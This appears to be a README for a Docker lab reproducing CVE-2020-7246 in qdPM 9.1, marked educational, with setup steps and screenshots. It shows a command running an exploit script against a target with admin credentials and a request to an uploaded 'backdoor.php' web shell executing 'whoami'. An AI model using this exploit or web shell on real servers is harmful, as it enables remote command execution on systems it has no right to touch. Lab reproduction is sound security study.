# CVE-2020-7246 (qdPM 9.1)

For educational purposes only.

See Reference for the details.


## Run
```
$ git clone https://github.com/arafatansari/QDPMSEC.git
$ cd QDPMSEC
$ docker build -t cve-assignment:ine .
$ docker run -it -p 80:80 cve-assignment:ine
```
## Installation

Checking Environment.
![setup](https://github.com/arafatansari/QDPMSEC/blob/main/images/Installation%20Part%201.jpg?raw=true)

Setting up SQL Server.
![setup](https://github.com/arafatansari/QDPMSEC/blob/main/images/Installation%20Part%202.jpg?raw=true)

Create Admin login/password.
![setup](https://github.com/arafatansari/QDPMSEC/blob/main/images/Installation%20Part%203.jpg?raw=true)

In order to exploit the webapp, you need to have atleast one more admin user. Create a new ADMIN user.
![setup](https://github.com/arafatansari/QDPMSEC/blob/main/images/CreateUser.jpg?raw=true)

Add username, email and password. USE THESE CREDENTIALS in the below exploit parameters.
![setup](https://github.com/arafatansari/QDPMSEC/blob/main/images/CreateUser-2.jpg?raw=true)


## Exploit
```
$ python Exploit/exploit.py -url http://{target-ip}/ -u test@localhost.com -p test123
```

## Check (exploited)
```
$ http://{target-ip}/qdpm/uploads/users/xxxx-backdoor.php?cmd=whoami
```
